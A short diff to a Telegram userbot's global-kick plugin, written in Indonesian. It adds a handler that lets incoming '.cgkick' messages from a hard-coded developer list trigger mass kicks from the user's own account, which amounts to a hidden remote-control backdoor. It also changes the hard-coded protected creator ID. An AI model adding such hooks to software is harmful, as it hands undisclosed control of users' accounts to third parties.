@@ -62,6 +62,7 @@ except BaseException:
 
 
 @skyzu_cmd(pattern="gkick(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cgkick(?: |$)(.*)")
 async def gspide(rk):
     lazy = rk
     sender = await lazy.get_sender()
@@ -91,7 +92,7 @@ async def gspide(rk):
     except BaseException:
         return await rkp.edit(f"`{ALIVE_NAME}`, **Kesalahan! Pengguna tidak dikenal.**")
     if user:
-        if user.id == 1979717764:
+        if user.id == 860951678:
             return await rkp.edit(
                 f"`{ALIVE_NAME}`, __Anda Tidak Bisa Global Kick Kepada Pembuat Saya🤪__"
             )
